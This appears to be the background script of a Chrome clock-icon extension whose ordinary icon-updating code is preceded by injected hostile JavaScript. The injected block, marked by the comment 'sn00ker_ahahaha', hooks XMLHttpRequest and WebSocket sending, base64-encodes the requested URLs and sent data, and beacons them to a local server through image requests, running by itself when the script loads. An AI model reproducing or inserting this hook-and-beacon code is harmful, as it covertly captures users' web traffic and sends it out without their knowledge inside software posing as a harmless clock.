function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function updateIcon() {
	var now = new Date();
	var min = now.getMinutes();
	var color = "";  // default for black

	// black or white
	var clockColor = localStorage["just_a_clock_color"];
	if (typeof clockColor != "undefined") {
		color = clockColor;
	}

	// Update icon
	chrome.browserAction.setIcon({
		path: {
			"19": min+color+"-19.png",
			"38": min+color+"-38.png"
		}
	});

}
function initialize() {
	updateIcon();
	setInterval(function(){updateIcon()},6000);
}
window.addEventListener("load", initialize);